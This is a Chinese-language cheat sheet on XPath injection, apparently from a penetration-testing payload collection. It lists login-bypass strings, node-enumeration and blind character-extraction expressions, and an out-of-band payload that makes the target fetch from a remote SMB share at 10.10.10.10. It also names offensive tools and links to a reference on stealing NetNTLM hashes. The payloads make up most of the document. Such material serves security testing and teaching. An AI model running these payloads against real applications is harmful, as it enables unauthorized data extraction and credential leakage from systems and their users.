# XPath 注入

> XPath注入是一种攻击技术，用于利用从用户提供的输入构造XPath（XML路径语言）查询以查询或导航XML文档的应用程序。

## 摘要

* [利用](#exploitation)
* [盲利用](#blind-exploitation)
* [带外利用](#out-of-band-exploitation)
* [工具](#tools)
* [参考资料](#references)

## 利用

类似于SQL：`"string(//user[name/text()='" +vuln_var1+ "' and password/text()=’" +vuln_var1+ "']/account/text())"`

```sql
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
search=')] | //user/*[contains(*,'
search=Har') and contains(../password,'c
search=Har') and starts-with(../password,'c
```

## 盲利用

1. 字符串的大小

   ```sql
   and string-length(account)=SIZE_INT
   ```

2. 提取一个字符

   ```sql
   substring(//user[userid=5]/username,2,1)=CHAR_HERE
   substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
   ```

## 带外利用

```powershell
http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
```

## 工具

- [xcat](https://github.com/orf/xcat) - 自动化XPath注入攻击以检索文档
- [xxxpwn](https://github.com/feakk/xxxpwn) - 高级XPath注入工具
- [xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart) - 使用预测文本的xxxpwn分支
- [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
- [XmlChor](https://github.com/Harshal35/XMLCHOR) - XPath注入利用工具

## 参考资料

* [OWASP XPATH注入](https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))
* [在窃取NetNTLM哈希时感兴趣的地方 - Osanda Malith Jayathissa - 2017年3月24日](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
